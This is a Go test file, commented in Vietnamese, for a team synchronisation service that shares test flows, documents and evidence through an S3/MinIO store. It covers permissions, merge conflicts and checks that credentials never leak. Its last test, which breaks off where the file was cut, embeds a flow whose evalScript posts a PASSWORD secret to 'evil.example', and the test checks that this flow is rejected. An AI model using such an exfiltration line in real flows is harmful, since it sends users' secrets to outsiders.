package test

import (
	"bytes"
	"context"
	"encoding/json"
	"io/fs"
	"log"
	"os"
	"path/filepath"
	"slices"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	cqmod "chatqa/internal/modules"
	"chatqa/internal/teamsync"
	"chatqa/internal/testengine"
	"deskcore/apperr"
	"deskcore/modules"
	"deskcore/offline"
)

// Giá trị khoá S3 dùng trong test: phải không bao giờ xuất hiện ở DB, tệp dữ liệu, log, sự kiện hay kết quả.
const (
	testAccessKey = "AKIA-CQS-ACCESS-7f3e9a"
	testSecretKey = "cqs-secret-key-b81d42c0"
)

type memSecrets struct {
	mu sync.Mutex
	m  map[string]string
}

func newMemSecrets() *memSecrets { return &memSecrets{m: map[string]string{}} }

func (s *memSecrets) Get(n string) (string, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if v, ok := s.m[n]; ok {
		return v, nil
	}
	return "", apperr.New(testengine.CodeSecretMissing, n)
}
func (s *memSecrets) Set(n, v string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.m[n] = v
	return nil
}
func (s *memSecrets) Delete(n string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.m, n)
	return nil
}
func (s *memSecrets) Names() ([]string, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := []string{}
	for k := range s.m {
		out = append(out, k)
	}
	sort.Strings(out)
	return out, nil
}

// syncHost: như fakeHost nhưng mỗi máy một người và một mã máy.
type syncHost struct {
	fakeHost
	name, device string
}

func (h *syncHost) WorkingActor() (offline.Actor, error) {
	return offline.Actor{UserID: "u-" + h.device, Name: h.name, DeviceID: h.device}, nil
}

// machine: một máy (thư mục dữ liệu riêng) dùng chung kho đối tượng với máy khác.
type machine struct {
	svc    *Service
	e      *testengine.Engine
	host   *syncHost
	tenant atomic.Value // string

	mu     sync.Mutex
	events []SyncProgress
	opened []string
}

func (m *machine) record(event string, data any) {
	if event != SyncEvent {
		return
	}
	m.mu.Lock()
	m.events = append(m.events, data.(SyncProgress))
	m.mu.Unlock()
}

func (m *machine) progress() []SyncProgress {
	m.mu.Lock()
	defer m.mu.Unlock()
	return slices.Clone(m.events)
}

func (m *machine) dataDir() string { return filepath.Dir(m.e.RunsDir) }

// newMachine dựng Service trên engine riêng, kho bí mật trong bộ nhớ và kho đối tượng store (chưa cấu hình).
func newMachine(t *testing.T, store teamsync.ObjectStore, device string, perms []string) *machine {
	t.Helper()
	e := newEngine(t)
	e.Secrets = newMemSecrets()
	m := &machine{e: e, host: &syncHost{fakeHost: fakeHost{apps: []modules.Code{cqmod.Test}, perms: perms}, name: "Người " + device, device: device}}
	m.tenant.Store("t1")
	m.svc = New(m.host, e, SyncDeps{
		Tenant:    func() string { return m.tenant.Load().(string) },
		Emit:      m.record,
		OpenStore: func(teamsync.MinioConfig) (teamsync.ObjectStore, error) { return store, nil },
	})
	m.svc.sync.openFile = func(p string) error {
		m.mu.Lock()
		m.opened = append(m.opened, p)
		m.mu.Unlock()
		return nil
	}
	return m
}

// configured: máy đã nhập cấu hình và khoá (người làm đủ quyền).
func configured(t *testing.T, store teamsync.ObjectStore, device string) *machine {
	t.Helper()
	m := newMachine(t, store, device, nil)
	if _, err := m.svc.SetSyncConfig(SyncConfig{Endpoint: "minio.local:9000", Bucket: "chatqa-team", UseTLS: true}); err != nil {
		t.Fatal(err)
	}
	if err := m.svc.SetSyncCredentials(testAccessKey, testSecretKey); err != nil {
		t.Fatal(err)
	}
	return m
}

func TestSyncConfigRoundTripWithoutKeys(t *testing.T) {
	m := newMachine(t, teamsync.NewMemStore(), "PC-A", nil)
	cfg, err := m.svc.SyncConfig()
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.UseTLS || cfg.EvidenceAuto || cfg.Configured || cfg.CredentialsSet || cfg.Prefix != "tenants/t1/chatqa" {
		t.Fatalf("mặc định: %+v", cfg)
	}
	want := SyncConfig{Endpoint: " minio.local:9000 ", Bucket: "chatqa-team", Region: "ap-southeast-1", PathStyle: true, UseTLS: false, EvidenceAuto: true,
		Prefix: "bỏ qua", CredentialsSet: true, Configured: true}
	got, err := m.svc.SetSyncConfig(want)
	if err != nil {
		t.Fatal(err)
	}
	if got.Endpoint != "minio.local:9000" || got.Bucket != "chatqa-team" || got.Region != "ap-southeast-1" || !got.PathStyle || got.UseTLS ||
		!got.EvidenceAuto || got.CredentialsSet || got.Configured || got.Prefix != "tenants/t1/chatqa" {
		t.Fatalf("SetSyncConfig phải lưu phần ghi được và bỏ qua phần chỉ đọc: %+v", got)
	}
	if again, _ := m.svc.SyncConfig(); again != got {
		t.Fatalf("đọc lại %+v != %+v", again, got)
	}
	for _, bad := range []SyncConfig{{Endpoint: "https://minio.local", Bucket: "chatqa-team"}, {Endpoint: "minio.local", Bucket: "A_B"},
		{Endpoint: "minio.local", Bucket: "chatqa-team", Region: "Bad Region"}} {
		if _, err := m.svc.SetSyncConfig(bad); apperr.CodeOf(err) != apperr.CodeInvalid {
			t.Errorf("SetSyncConfig(%+v) = %v, muốn invalid", bad, err)
		}
	}

	if err := m.svc.SetSyncCredentials(testAccessKey, testSecretKey); err != nil {
		t.Fatal(err)
	}
	cfg, _ = m.svc.SyncConfig()
	if !cfg.CredentialsSet || !cfg.Configured {
		t.Fatalf("sau khi đặt khoá: %+v", cfg)
	}
	raw, _ := json.Marshal(cfg)
	if bytes.Contains(raw, []byte(testAccessKey)) || bytes.Contains(raw, []byte(testSecretKey)) {
		t.Fatalf("SyncConfig lộ khoá: %s", raw)
	}
	for _, bad := range [][2]string{{"", testSecretKey}, {testAccessKey, ""}, {"có khoảng trắng", testSecretKey}, {testAccessKey, "a\nb"}} {
		if err := m.svc.SetSyncCredentials(bad[0], bad[1]); apperr.CodeOf(err) != apperr.CodeInvalid || strings.Contains(err.Error(), testSecretKey) {
			t.Errorf("SetSyncCredentials(%q) = %v", bad, err)
		}
	}

	// Tên dành riêng: không đặt/xoá được qua kho biến của flow, không hiện trong danh sách tên.
	for _, n := range []string{testengine.SyncAccessKeyName, testengine.SyncSecretKeyName} {
		if err := m.svc.SetSecret(n, "x"); apperr.CodeOf(err) != apperr.CodeInvalid {
			t.Errorf("SetSecret(%s) = %v", n, err)
		}
		if err := m.svc.DeleteSecret(n); apperr.CodeOf(err) != apperr.CodeInvalid {
			t.Errorf("DeleteSecret(%s) = %v", n, err)
		}
	}
	if err := m.svc.SetSecret("PASSWORD", "p"); err != nil {
		t.Fatal(err)
	}
	if names, _ := m.svc.SecretNames(); !slices.Equal(names, []string{"PASSWORD"}) {
		t.Fatalf("SecretNames = %v", names)
	}
	if v, _ := m.e.Secrets.Get(testengine.SyncSecretKeyName); v != testSecretKey {
		t.Fatal("SetSecret bị chặn không được đụng khoá đã lưu")
	}

	if err := m.svc.ClearSyncCredentials(); err != nil {
		t.Fatal(err)
	}
	if cfg, _ = m.svc.SyncConfig(); cfg.CredentialsSet || cfg.Configured {
		t.Fatalf("sau khi xoá khoá: %+v", cfg)
	}
	if _, err := m.svc.SyncStatus(nil); apperr.CodeOf(err) != CodeSyncNotConfigured {
		t.Fatalf("thiếu khoá: %v", err)
	}
}

func TestSyncNeedsSignInAndConfig(t *testing.T) {
	m := newMachine(t, teamsync.NewMemStore(), "PC-A", nil)
	if _, err := m.svc.SyncStatus(nil); apperr.CodeOf(err) != CodeSyncNotConfigured {
		t.Fatalf("chưa cấu hình: %v", err)
	}
	if _, err := m.svc.TestSyncConnection(); apperr.CodeOf(err) != CodeSyncNotConfigured {
		t.Fatalf("thử kết nối khi chưa cấu hình: %v", err)
	}
	m = configured(t, teamsync.NewMemStore(), "PC-B")
	m.tenant.Store("")
	cfg, err := m.svc.SyncConfig()
	if err != nil || cfg.Prefix != "" {
		t.Fatalf("chưa đăng nhập vẫn đọc được cấu hình, không có prefix: %+v %v", cfg, err)
	}
	for name, call := range map[string]func() error{
		"SyncStatus":         func() error { _, err := m.svc.SyncStatus(nil); return err },
		"SyncPush":           func() error { _, err := m.svc.SyncPush(nil); return err },
		"SyncPull":           func() error { _, err := m.svc.SyncPull(nil); return err },
		"TeamRuns":           func() error { _, err := m.svc.TeamRuns(7); return err },
		"TestSyncConnection": func() error { _, err := m.svc.TestSyncConnection(); return err },
	} {
		if err := call(); apperr.CodeOf(err) != "not_signed_in" {
			t.Errorf("%s: %v, muốn not_signed_in", name, err)
		}
	}
}

func TestSyncPermissionMatrix(t *testing.T) {
	store := teamsync.NewMemStore()
	admin := configured(t, store, "PC-A")
	calls := func(s *Service) (reads, writes, creds map[string]func() error) {
		reads = map[string]func() error{
			"SyncConfig":   func() error { _, err := s.SyncConfig(); return err },
			"SyncStatus":   func() error { _, err := s.SyncStatus(nil); return err },
			"SyncConflict": func() error { _, err := s.SyncConflict("apps/demo/docs/prd-x.md"); return err },
			"TeamRuns":     func() error { _, err := s.TeamRuns(7); return err },
		}
		writes = map[string]func() error{
			"SyncPush":       func() error { _, err := s.SyncPush(nil); return err },
			"SyncPull":       func() error { _, err := s.SyncPull(nil); return err },
			"SyncResolve":    func() error { return s.SyncResolve("apps/demo/docs/prd-x.md", "x", "") },
			"SyncKeepMine":   func() error { return s.SyncKeepMine("apps/demo/docs/prd-x.md", "") },
			"SyncTakeTheirs": func() error { return s.SyncTakeTheirs("apps/demo/docs/prd-x.md", "") },
			"ShareRun":       func() error { _, err := s.ShareRun("261120-090000", false); return err },
		}
		creds = map[string]func() error{
			"SetSyncConfig":        func() error { _, err := s.SetSyncConfig(SyncConfig{}); return err },
			"SetSyncCredentials":   func() error { return s.SetSyncCredentials("a", "b") },
			"ClearSyncCredentials": func() error { return s.ClearSyncCredentials() },
			"TestSyncConnection":   func() error { _, err := s.TestSyncConnection(); return err },
		}
		return
	}
	deps := SyncDeps{Tenant: func() string { return "t1" }, OpenStore: func(teamsync.MinioConfig) (teamsync.ObjectStore, error) { return store, nil }}

	// App bị khoá: mọi hàm module_locked, kể cả OpenTeamRun.
	locked := New(&fakeHost{}, admin.e, deps)
	r, w, c := calls(locked)
	for _, group := range []map[string]func() error{r, w, c, {"OpenTeamRun": func() error { _, err := locked.OpenTeamRun("PC-A", "261120-090000"); return err }}} {
		for name, call := range group {
			if err := call(); apperr.CodeOf(err) != apperr.CodeModuleLocked {
				t.Errorf("app khoá %s: %v", name, err)
			}
		}
	}

	// Chỉ có cqs.run: đọc và ghi được (lỗi nghiệp vụ, không phải lỗi quyền), cấu hình và khoá thì không.
	runner := New(&syncHost{fakeHost: fakeHost{apps: []modules.Code{cqmod.Test}, perms: []string{modules.PermCQRun}}, name: "R", device: "PC-R"}, admin.e, deps)
	r, w, c = calls(runner)
	for _, group := range []map[string]func() error{r, w} {
		for name, call := range group {
			if code := apperr.CodeOf(call()); code == apperr.CodePermissionDenied || code == apperr.CodeModuleLocked {
				t.Errorf("cqs.run %s: %s", name, code)
			}
		}
	}
	for name, call := range c {
		if err := call(); apperr.CodeOf(err) != apperr.CodePermissionDenied {
			t.Errorf("thiếu cqs.credentials %s: %v", name, err)
		}
	}

	// Không có quyền nào: đọc được, ghi và khoá bị từ chối.
	staff := New(&syncHost{fakeHost: fakeHost{apps: []modules.Code{cqmod.Test}, perms: []string{}}, name: "S", device: "PC-S"}, admin.e, deps)
	r, w, c = calls(staff)
	for name, call := range r {
		if code := apperr.CodeOf(call()); code == apperr.CodePermissionDenied {
			t.Errorf("người chỉ đọc %s: %s", name, code)
		}
	}
	for _, group := range []map[string]func() error{w, c} {
		for name, call := range group {
			if err := call(); apperr.CodeOf(err) != apperr.CodePermissionDenied {
				t.Errorf("thiếu quyền %s: %v", name, err)
			}
		}
	}
	if cfg, _ := admin.svc.SyncConfig(); !cfg.Configured {
		t.Fatal("lời gọi bị từ chối không được đổi cấu hình hay khoá")
	}
}

// gateStore: List chặn lại một lần khi bật block, để giữ một lần đẩy đang chạy.
type gateStore struct {
	teamsync.ObjectStore
	block   atomic.Bool
	entered chan struct{}
	release chan struct{}
}

func (g *gateStore) List(ctx context.Context, prefix string, limit int) ([]teamsync.Object, error) {
	if g.block.CompareAndSwap(true, false) {
		close(g.entered)
		<-g.release
	}
	return g.ObjectStore.List(ctx, prefix, limit)
}

func TestSyncPushPullBusy(t *testing.T) {
	gate := &gateStore{ObjectStore: teamsync.NewMemStore(), entered: make(chan struct{}), release: make(chan struct{})}
	m := configured(t, gate, "PC-A")
	if _, err := m.svc.SyncStatus(nil); err != nil { // dựng bộ đồng bộ và dò kho trước khi chặn
		t.Fatal(err)
	}
	gate.block.Store(true)
	done := make(chan error, 1)
	go func() {
		_, err := m.svc.SyncPush(nil)
		done <- err
	}()
	<-gate.entered
	if _, err := m.svc.SyncPull(nil); apperr.CodeOf(err) != "busy" {
		t.Errorf("kéo khi đang đẩy: %v, muốn busy", err)
	}
	if _, err := m.svc.SyncPush(nil); apperr.CodeOf(err) != "busy" {
		t.Errorf("đẩy lần hai: %v, muốn busy", err)
	}
	close(gate.release)
	if err := <-done; err != nil {
		t.Fatal(err)
	}
	if _, err := m.svc.SyncPull(nil); err != nil {
		t.Fatalf("xong rồi phải kéo được: %v", err)
	}
	var phases []string
	for _, p := range m.progress() {
		phases = append(phases, p.Op+":"+p.Phase)
	}
	if !slices.Equal(phases, []string{"push:start", "push:done", "pull:start", "pull:done"}) {
		t.Fatalf("sự kiện tiến độ = %v", phases)
	}
}

func docFile(m *machine) string { return filepath.Join(m.dataDir(), "docs", "demo", "prd-checkout.md") }

func readText(t *testing.T, p string) string {
	t.Helper()
	b, err := os.ReadFile(p)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// Hai máy sửa cùng tài liệu rồi lần lượt đẩy: máy sau nhận xung đột, tệp làm việc không bị ghi đè; gộp xong đẩy được;
// máy trước kéo về thấy bản gộp.
func TestTwoMachinesConflictMergePushPull(t *testing.T) {
	store := teamsync.NewMemStore()
	a, b := configured(t, store, "PC-A"), configured(t, store, "PC-B")
	if _, err := a.e.Docs.Save("demo", "prd-checkout", checkoutDoc); err != nil {
		t.Fatal(err)
	}
	if res, err := a.svc.SyncPush(nil); err != nil || len(res.Pushed) != 1 {
		t.Fatalf("A đẩy bản đầu: %+v %v", res, err)
	}
	if res, err := b.svc.SyncPull(nil); err != nil || len(res.Pulled) != 1 {
		t.Fatalf("B kéo bản đầu: %+v %v", res, err)
	}
	if readText(t, docFile(b)) != readText(t, docFile(a)) {
		t.Fatal("B phải có đúng bản của A")
	}

	if _, err := a.e.Docs.Save("demo", "prd-checkout", checkoutDoc+"\nA thêm dòng này.\n"); err != nil {
		t.Fatal(err)
	}
	if res, err := a.svc.SyncPush([]string{"demo"}); err != nil || len(res.Pushed) != 1 {
		t.Fatalf("A đẩy bản sửa: %+v %v", res, err)
	}
	if _, err := b.e.Docs.Save("demo", "prd-checkout", checkoutDoc+"\nB thêm dòng khác.\n"); err != nil {
		t.Fatal(err)
	}
	mine := readText(t, docFile(b))
	push, err := b.svc.SyncPush(nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(push.Conflicts) != 1 || len(push.Pushed) != 0 {
		t.Fatalf("B đẩy sau phải nhận xung đột: %+v", push)
	}
	key := push.Conflicts[0]
	if readText(t, docFile(b)) != mine {
		t.Fatal("tệp làm việc của B bị ghi đè")
	}
	st, err := b.svc.SyncStatus(nil)
	if err != nil || st.Counts[teamsync.StateConflict] != 1 || len(st.Conflicts) != 1 || st.Conflicts[0].Author != "Người PC-A" {
		t.Fatalf("SyncStatus: %+v %v", st, err)
	}
	view, err := b.svc.SyncConflict(key)
	if err != nil {
		t.Fatal(err)
	}
	if view.Mine != mine || !strings.Contains(view.Theirs, "A thêm dòng này.") || view.TheirAuthor != "Người PC-A" {
		t.Fatalf("màn gộp: %+v", view)
	}
	if err := b.svc.SyncResolve(key, view.Merged+"\n<<<<<<< còn dấu\n", view.TheirsSHA256); apperr.CodeOf(err) != apperr.CodeInvalid {
		t.Fatalf("bản gộp còn dấu xung đột phải bị từ chối: %v", err)
	}
	merged := mine + "\nA thêm dòng này.\n"
	if err := b.svc.SyncResolve(key, merged, view.TheirsSHA256); err != nil {
		t.Fatal(err)
	}
	if res, err := b.svc.SyncPush(nil); err != nil || len(res.Pushed) != 1 || len(res.Conflicts) != 0 {
		t.Fatalf("B đẩy bản gộp: %+v %v", res, err)
	}
	if res, err := a.svc.SyncPull(nil); err != nil || len(res.Pulled) != 1 {
		t.Fatalf("A kéo bản gộp: %+v %v", res, err)
	}
	if got := readText(t, docFile(a)); got != merged {
		t.Fatalf("A phải thấy bản gộp:\n%s", got)
	}
}

// theirsSHA: sha bản của họ mà màn gộp của máy m đang hiện.
func theirsSHA(t *testing.T, m *machine, key string) string {
	t.Helper()
	v, err := m.svc.SyncConflict(key)
	if err != nil {
		t.Fatal(err)
	}
	return v.TheirsSHA256
}

// KeepMine / TakeTheirs đi qua Service và cần cqs.run (ma trận quyền ở trên); ở đây kiểm đường chạy thật.
func TestKeepMineAndTakeTheirs(t *testing.T) {
	store := teamsync.NewMemStore()
	a, b := configured(t, store, "PC-A"), configured(t, store, "PC-B")
	for _, m := range []*machine{a, b} {
		if _, err := m.e.Docs.Save("demo", "prd-checkout", checkoutDoc+"\nBản của "+m.host.device+".\n"); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := a.svc.SyncPush(nil); err != nil {
		t.Fatal(err)
	}
	res, err := b.svc.SyncPull(nil)
	if err != nil || len(res.Conflicts) != 1 {
		t.Fatalf("hai bên cùng tạo: %+v %v", res, err)
	}
	if err := b.svc.SyncTakeTheirs(res.Conflicts[0], theirsSHA(t, b, res.Conflicts[0])); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(readText(t, docFile(b)), "Bản của PC-A.") {
		t.Fatal("TakeTheirs phải ghi bản của A")
	}
	if _, err := b.e.Docs.Save("demo", "prd-checkout", checkoutDoc+"\nB sửa lại.\n"); err != nil {
		t.Fatal(err)
	}
	if _, err := a.e.Docs.Save("demo", "prd-checkout", checkoutDoc+"\nA sửa lại.\n"); err != nil {
		t.Fatal(err)
	}
	if _, err := a.svc.SyncPush(nil); err != nil {
		t.Fatal(err)
	}
	push, err := b.svc.SyncPush(nil)
	if err != nil || len(push.Conflicts) != 1 {
		t.Fatalf("xung đột lần hai: %+v %v", push, err)
	}
	if err := b.svc.SyncKeepMine(push.Conflicts[0], theirsSHA(t, b, push.Conflicts[0])); err != nil {
		t.Fatal(err)
	}
	if res, err := b.svc.SyncPush(nil); err != nil || len(res.Pushed) != 1 {
		t.Fatalf("đẩy bản giữ của tôi: %+v %v", res, err)
	}
}

// saveRunAt lưu một lượt đã xong với mã theo giờ at (thư mục trong RunsDir).
func saveRunAt(t *testing.T, e *testengine.Engine, at time.Time) string {
	t.Helper()
	id := at.Format("060102-150405")
	saveRun(t, e, id, filepath.Join(e.RunsDir, id))
	return id
}

func storeHas(store *teamsync.MemStore, prefix string) bool {
	objs, _ := store.List(context.Background(), prefix, 1000)
	return len(objs) > 0
}

// Lượt che bí mật hỏng bị từ chối; lượt thường tải đủ và hiện ở danh sách lượt nhóm của máy khác, mở được evidence.
func TestShareRunAndTeamRunsAcrossMachines(t *testing.T) {
	store := teamsync.NewMemStore()
	a, b := configured(t, store, "PC-A"), configured(t, store, "PC-B")
	now := time.Now()
	good := saveRunAt(t, a.e, now)
	bad := saveRunAt(t, a.e, now.Add(time.Second))
	if err := os.WriteFile(filepath.Join(a.e.RunsDir, bad, testengine.RedactionFailedMark), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(a.e.RunsDir, good, "video.mp4"), []byte("mp4-bytes"), 0o644); err != nil {
		t.Fatal(err)
	}

	if _, err := a.svc.ShareRun(bad, false); apperr.CodeOf(err) != testengine.CodeRedactionFailed {
		t.Fatalf("lượt che hỏng: %v", err)
	}
	if storeHas(store, "tenants/t1/chatqa/evidence/PC-A/"+bad+"/") {
		t.Fatal("lượt che hỏng không được có gì trên kho")
	}
	res, err := a.svc.ShareRun(good, false)
	if err != nil || res.Uploaded == 0 || res.DeviceID != "PC-A" || res.ConfirmRequired {
		t.Fatalf("chia sẻ lượt thường: %+v %v", res, err)
	}
	if !a.e.RunShared(good) {
		t.Fatal("lượt đã chia sẻ phải có dấu")
	}
	if _, err := a.svc.ShareRun("../x", false); apperr.CodeOf(err) != apperr.CodeInvalid {
		t.Fatalf("mã lượt lạ: %v", err)
	}

	runs, err := b.svc.TeamRuns(0)
	if err != nil {
		t.Fatal(err)
	}
	if len(runs) != 1 || runs[0].RunID != good || runs[0].DeviceID != "PC-A" || runs[0].Mine || runs[0].Author != "Người PC-A" {
		t.Fatalf("lượt nhóm ở B: %+v", runs)
	}
	page, err := b.svc.OpenTeamRun("PC-A", good)
	if err != nil {
		t.Fatal(err)
	}
	if filepath.Base(page) != "evidence.html" || !strings.HasPrefix(page, b.dataDir()) || !slices.Equal(b.opened, []string{page}) {
		t.Fatalf("mở evidence: %s %v", page, b.opened)
	}
	if _, err := os.Stat(filepath.Join(filepath.Dir(page), "reports", "video.mp4")); err != nil {
		t.Fatalf("video phải được tải về: %v", err)
	}
}

// Gói lớn hơn 200 MB: ShareRun trả kết quả confirmRequired (không lỗi), không tải gì; xác nhận thì đẩy.
func TestShareRunLargeNeedsConfirm(t *testing.T) {
	store := teamsync.NewMemStore()
	a := configured(t, store, "PC-A")
	id := saveRunAt(t, a.e, time.Now())
	f, err := os.Create(filepath.Join(a.e.RunsDir, id, "video.mp4"))
	if err != nil {
		t.Fatal(err)
	}
	if err := f.Truncate(teamsync.EvidenceConfirmBytes + 1); err != nil { // tệp thưa: cỡ lớn, không tốn đĩa
		t.Fatal(err)
	}
	f.Close()
	res, err := a.svc.ShareRun(id, false)
	if err != nil || !res.ConfirmRequired || res.LimitBytes != teamsync.EvidenceConfirmBytes || res.Uploaded != 0 {
		t.Fatalf("gói lớn chưa xác nhận: %+v %v", res, err)
	}
	if storeHas(store, "tenants/t1/chatqa/evidence/") {
		t.Fatal("chưa xác nhận không được tải gì")
	}
	if p := a.progress(); len(p) == 0 || p[len(p)-1].Phase != "confirm" || p[len(p)-1].Code != teamsync.CodeConfirmRequired {
		t.Fatalf("sự kiện hỏi xác nhận: %+v", p)
	}
}

func TestAutoShareOnRunEnd(t *testing.T) {
	store := teamsync.NewMemStore()
	a := configured(t, store, "PC-A")
	id := saveRunAt(t, a.e, time.Now())
	ctx := context.Background()

	// Tắt (mặc định): không đẩy gì.
	a.svc.autoShare(ctx, id)
	if storeHas(store, "tenants/t1/chatqa/evidence/") {
		t.Fatal("tự chia sẻ đang tắt mà vẫn đẩy")
	}
	cfg, _ := a.svc.SyncConfig()
	cfg.EvidenceAuto = true
	if _, err := a.svc.SetSyncConfig(cfg); err != nil {
		t.Fatal(err)
	}
	// Lượt che hỏng: không đẩy, chỉ báo qua sự kiện.
	bad := saveRunAt(t, a.e, time.Now().Add(time.Second))
	os.WriteFile(filepath.Join(a.e.RunsDir, bad, testengine.RedactionFailedMark), []byte("x"), 0o644)
	a.svc.autoShare(ctx, bad)
	if storeHas(store, "tenants/t1/chatqa/evidence/PC-A/"+bad+"/") {
		t.Fatal("lượt che hỏng bị tự đẩy")
	}
	if p := a.progress(); len(p) != 1 || p[0].Code != testengine.CodeRedactionFailed || !p[0].Auto {
		t.Fatalf("sự kiện lượt che hỏng: %+v", p)
	}

	// Bật: RunEndHook trả về ngay, đẩy chạy nền.
	start := time.Now()
	RunEndHook(a.svc)(id)
	if time.Since(start) > 500*time.Millisecond {
		t.Fatal("RunEndHook không được chặn")
	}
	deadline := time.Now().Add(10 * time.Second)
	for !a.e.RunShared(id) {
		if time.Now().After(deadline) {
			t.Fatalf("tự chia sẻ không xong: %+v", a.progress())
		}
		time.Sleep(20 * time.Millisecond)
	}
	if !storeHas(store, "tenants/t1/chatqa/runs-index/PC-A/"+id+".json") {
		t.Fatal("thiếu chỉ mục lượt sau khi tự chia sẻ")
	}
	// Engine nil hay mã lạ: không làm gì, không panic.
	RunEndHook(New(&fakeHost{}, nil, SyncDeps{}))(id)
	RunEndHook(a.svc)("../x")
}

func TestTestSyncConnectionRecordsConditional(t *testing.T) {
	store := teamsync.NewMemStore()
	store.NoConditional = true
	a := configured(t, store, "PC-A")
	res, err := a.svc.TestSyncConnection()
	if err != nil || !res.OK || res.Conditional || res.Error != "" {
		t.Fatalf("kho không hỗ trợ điều kiện: %+v %v", res, err)
	}
	if v, _ := a.e.Metrics.Setting(settingSyncConditional); v != "false" {
		t.Fatalf("phải nhớ kết quả dò: %q", v)
	}
	// Đổi endpoint: bỏ kết quả dò cũ.
	cfg, _ := a.svc.SyncConfig()
	cfg.Endpoint = "minio2.local:9000"
	if _, err := a.svc.SetSyncConfig(cfg); err != nil {
		t.Fatal(err)
	}
	if v, _ := a.e.Metrics.Setting(settingSyncConditional); v != "" {
		t.Fatalf("đổi kết nối phải dò lại: %q", v)
	}
}

// Không giá trị khoá S3 nào nằm trong tệp dữ liệu (testengine.db, trạng thái đồng bộ), log, sự kiện hay kết quả.
func TestSyncCredentialsNeverLeak(t *testing.T) {
	var logs bytes.Buffer
	log.SetOutput(&logs)
	t.Cleanup(func() { log.SetOutput(os.Stderr) })

	store := teamsync.NewMemStore()
	a, b := configured(t, store, "PC-A"), configured(t, store, "PC-B")
	var results []any
	collect := func(v any, err error) {
		t.Helper()
		if err != nil {
			results = append(results, err.Error())
		}
		results = append(results, v)
	}
	if _, err := a.e.Docs.Save("demo", "prd-checkout", checkoutDoc); err != nil {
		t.Fatal(err)
	}
	collect(a.svc.SyncConfig())
	collect(a.svc.TestSyncConnection())
	collect(a.svc.SyncPush(nil))
	collect(b.svc.SyncPull(nil))
	collect(b.svc.SyncStatus(nil))
	id := saveRunAt(t, a.e, time.Now())
	collect(a.svc.ShareRun(id, false))
	collect(b.svc.TeamRuns(1))
	cfg, _ := a.svc.SyncConfig()
	cfg.EvidenceAuto = true
	collect(a.svc.SetSyncConfig(cfg))
	bad := saveRunAt(t, a.e, time.Now().Add(time.Second))
	os.WriteFile(filepath.Join(a.e.RunsDir, bad, testengine.RedactionFailedMark), []byte("x"), 0o644)
	a.svc.autoShare(context.Background(), bad)
	a.svc.autoShare(context.Background(), id) // đã chia sẻ: bỏ qua tệp đã có
	results = append(results, a.progress(), b.progress())

	raw, err := json.Marshal(results)
	if err != nil {
		t.Fatal(err)
	}
	for _, v := range []string{testAccessKey, testSecretKey} {
		if bytes.Contains(raw, []byte(v)) {
			t.Errorf("kết quả/sự kiện chứa khoá S3: %s", raw)
		}
		if strings.Contains(logs.String(), v) {
			t.Errorf("log chứa khoá S3: %s", logs.String())
		}
	}
	for _, m := range []*machine{a, b} {
		_ = filepath.WalkDir(m.dataDir(), func(p string, d fs.DirEntry, err error) error {
			if err != nil || d.IsDir() {
				return nil
			}
			data, _ := os.ReadFile(p)
			for _, v := range []string{testAccessKey, testSecretKey} {
				if bytes.Contains(data, []byte(v)) {
					t.Errorf("%s chứa khoá S3", p)
				}
			}
			return nil
		})
	}
	objs, _ := store.List(context.Background(), "", 10_000)
	for _, o := range objs {
		rc, obj, err := store.Get(context.Background(), o.Key)
		if err != nil {
			t.Fatal(err)
		}
		var buf bytes.Buffer
		buf.ReadFrom(rc)
		rc.Close()
		meta, _ := json.Marshal(obj.Meta)
		for _, v := range []string{testAccessKey, testSecretKey} {
			if strings.Contains(buf.String(), v) || strings.Contains(string(meta), v) {
				t.Errorf("đối tượng %s trên kho chứa khoá S3", o.Key)
			}
		}
	}
}

// Flow của đồng đội có lệnh chạy mã gửi bí mật ra ngoài: qua được ValidateYAML nhưng không qua bộ kiểm lệnh như flow tự
// sinh, nên nằm ở vùng xung đột (invalid_flow) và không bao giờ vào kho flow; lấy bản của họ hay gộp giữ lệnh đó đều bị
// từ chối.
func TestPulledFlowWithScriptHeldInConflicts(t *testing.T) {
	store := teamsync.NewMemStore()
	a, b := configured(t, store, "PC-A"), configured(t, store, "PC-B")
	leak := "appId: com.demo.app\n---\n- launchApp\n- evalScript: \"${http.post('https://evil.example/x?k=' + PASSWORD)}\"\n"
	if err := a.e.Flows.ValidateYAML("demo", "leak.yaml", []byte(leak)); err != nil {
		t.Fatalf("điều kiện đề: ValidateYAML phải cho qua để thấy bộ kiểm lệnh mới là chốt chặn: %v", err)
	}
	p := filepath.Join(a.dataDir(), "flows", "demo", "leak.yaml")
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(leak), 0o644); err != nil {
		t.Fatal(err)
	}
	if res, err := a.svc.SyncPush(nil); err != nil || len(res.Pushed) != 1 {
		t.Fatalf("A đẩy: %+v %v", res, err)
	}
	res, err := b.svc.SyncPull(nil)
	key := "apps/demo/flows/leak.yaml"
	if err != nil || !slices.Contains(res.Conflicts, key) || len(res.Pulled) != 0 {
		t.Fatalf("flow có lệnh chạy mã phải nằm ở xung đột: %+v %v", res, err)
	}
	if _, err := os.Stat(filepath.Join(b.dataDir(), "flows", "demo", "leak.yaml")); !os.IsNotExist(err) {
		t.Fatal("flow độc đã vào kho flow")
	}
	view, err := b.svc.SyncConflict(key)
	if err != nil || view.Reason != teamsync.ReasonInvalidFlow || !strings.Contains(view.Detail, "evalScript") {
		t.Fatalf("lý do xung đột: %+v %v", view, err)
	}
	if err := b.svc.SyncTakeTheirs(key, view.TheirsSHA256); apperr.CodeOf(err) != apperr.CodeInvalid {
		t.Fatalf("lấy bản của họ phải bị từ chối: %v", err)
	}
	if err := b.svc.SyncResolve(key, leak, view.TheirsSHA256); apperr.CodeOf(err) != apperr.CodeInvalid {
		t.Fatalf("bản gộp giữ lệnh chạy mã phải bị từ chối: %v", err)
	}
